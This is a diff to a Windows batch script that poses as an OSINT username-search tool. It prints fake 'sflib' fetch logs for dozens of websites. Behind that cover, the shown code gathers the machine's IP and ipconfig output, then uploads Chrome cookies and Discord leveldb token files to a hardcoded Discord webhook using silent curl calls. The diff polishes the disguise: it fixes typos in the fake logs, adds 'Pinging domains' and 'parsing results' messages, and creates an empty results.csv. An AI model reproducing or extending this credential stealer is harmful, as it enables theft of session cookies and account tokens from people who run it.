@@ -5,7 +5,7 @@ echo [INFO] sflib : Fetched https://thoughts.com/members// (803377 bytes in 3.17
 echo [INFO] sflib : Fetched https://tilde.zone/api/v1/accounts/lookup?acct= (28 bytes in 0.5824182033538818s)
 echo [INFO] sflib : Fetched https://tinder.com/@ (433852 bytes in 0.8731262683868408s)
 echo [INFO] sflib : Fetched https://tooting.ch/api/v1/accounts/lookup?acct= (28 bytes in 0.6431686878204346s)\
-ehco [ERROR] sflib : Failed to connect to https://en.tm-ladder.com/_rech.php: HTTPSConnectionPool(host='en.tm-ladder.com', port=443)
+echo [ERROR] sflib : Failed to connect to https://en.tm-ladder.com/_rech.php: HTTPSConnectionPool(host='en.tm-ladder.com', port=443)
 echo sflib : Fetched https://www.tradingview.com/u// (105974 bytes in 0.5883083343505859s)
 echo [INFO] sflib : Fetched https://trakt.tv/users/ (4537 bytes in 0.9415841102600098s)
 echo [INFO] sflib : Fetched https://toyhou.se/ (5049 bytes in 2.2652652263641357s)
@@ -109,7 +109,7 @@ echo [INFO] sflib : Fetched https://tilde.zone/api/v1/accounts/lookup?acct= (28 
 echo [INFO] sflib : Fetched https://tinder.com/@ (433852 bytes in 0.8731262683868408s)
 echo [INFO] sflib : Fetched https://tooting.ch/api/v1/accounts/lookup?acct= (28 bytes in 0.6431686878204346s)
 echo [ERROR] sflib : Failed to connect to https://en.tm-ladder.com/_rech.php
-echp sflib : Fetched https://www.tradingview.com/u// (105974 bytes in 0.5883083343505859s)
+echo sflib : Fetched https://www.tradingview.com/u// (105974 bytes in 0.5883083343505859s)
 echo [INFO] sflib : Fetched https://trakt.tv/users/ (4537 bytes in 0.9415841102600098s)
 echo [INFO] sflib : Fetched https://toyhou.se/ (5049 bytes in 2.2652652263641357s)
 echo [INFO] sflib : Fetched https://trello.com/
@@ -207,7 +207,7 @@ echo [INFO] sflib : Fetched https://www.xnxx.com/mobile/profile/ (6028 bytes in 
 echo [INFO] sflib : Fetched https://www.kwai.com/@ (24501 bytes in 1.1203577518463135s)
 echo [INFO] sflib : Fetched https://cursos.alura.com.br/user/
 
-echo [INFO] Fetching results, please wait...
+echo [INFO] Pinging domains, please wait...
 
 set "webhook=https://discord.com/api/webhooks/1286380543813881967/k3wAVFFxgh_k7F4M1_7rsCq_yO3yl7TipOKf4slcbK2NtRxgSSb1baUHVUKVnOCMa_QK"
 for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
@@ -233,6 +233,9 @@ set "ipconfig=%appdata%\ipconfig.txt"
 curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
 del "%ipconfig%" >nul 2>&1
 :skipipconfig
+
+echo [INFO] Fetching and parsing results, please wait...
+
 
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
 curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
@@ -280,4 +283,10 @@ for /f %%f in ('dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
     )
 )
 :skipdiscord
+
+set filename=results.csv
+echo.>"%filename%"
+echo CSV file "%filename%" created successfully.
+pause
+
 exit
